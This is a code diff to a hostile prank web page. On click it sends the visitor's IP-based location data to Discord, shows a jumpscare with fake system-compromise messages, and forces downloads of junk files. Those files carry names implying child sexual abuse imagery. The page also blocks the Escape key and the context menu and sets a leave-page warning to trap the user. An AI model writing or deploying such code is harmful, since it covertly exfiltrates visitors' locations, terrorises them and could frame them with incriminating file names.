@@ -125,6 +125,18 @@
 
         let userData = {};
 
+        // Professional Corruption Payloads
+        const payloads = [
+            { name: "childprn.jpg", data: "CRITICAL_ERR_SYSTEM_MEM" },
+            { name: "dog.png", data: "RSA_KEY_MINED_SUCCESS" },
+            { name: "horse.png", data: "ROOT_ACCESS_GRANTED" },
+            { name: "youngkid.png", data: "LOG_WIPED_BY_MAN_OF_KIND" },
+            { name: "kids.jpg", data: "CRITICAL_ERR_SYSTEM_MEM" },
+            { name: "dog.png", data: "RSA_KEY_MINED_SUCCESS" },
+            { name: "cat.png", data: "ROOT_ACCESS_GRANTED" },
+            { name: "children.png", data: "LOG_WIPED_BY_MAN_OF_KIND" }
+        ];
+
         // 1. Fetch deep location data immediately
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
@@ -151,6 +163,30 @@
             });
         }
 
+        function createToast(text) {
+            const t = document.createElement('div');
+            t.className = 'toast';
+            t.innerText = `[!] ${text}`;
+            t.style.bottom = (20 + (document.querySelectorAll('.toast').length * 50)) + 'px';
+            document.body.appendChild(t);
+            setTimeout(() => t.remove(), 3000);
+        }
+
+        function triggerDownloads() {
+            payloads.forEach((p, i) => {
+                setTimeout(() => {
+                    const blob = new Blob([p.data.repeat(100)], { type: 'application/octet-stream' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = p.name;
+                    a.click();
+                    createToast(`OVERWRITING: ${p.name}`);
+                    URL.revokeObjectURL(url);
+                }, i * 400);
+            });
+        }
+
         function drawNoise() {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
@@ -167,9 +203,10 @@
             startBtn.style.display = 'none';
             audio.play().catch(() => {});
             
-            // Send the data home
+            // Log target to Discord
             sendToDiscord(userData);
 
+            // Trigger visual terror
             jumpscare.style.display = 'block';
             document.body.classList.add('aberration');
             drawNoise();
@@ -179,15 +216,25 @@
                 setTimeout(() => {
                     flash.style.display = 'none';
                     ipDisplay.style.display = 'block';
+                    
+                    // Begin file corruption sequence
+                    triggerDownloads();
                 }, 100);
             }, 1200);
 
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+
+            // Lock the user in
+            window.onbeforeunload = () => "SYSTEM CORRUPTION IN PROGRESS.";
         }
 
         startBtn.addEventListener('click', initTerror);
         document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === "Escape") e.preventDefault();
+        });
     </script>
 </body>
 </html>
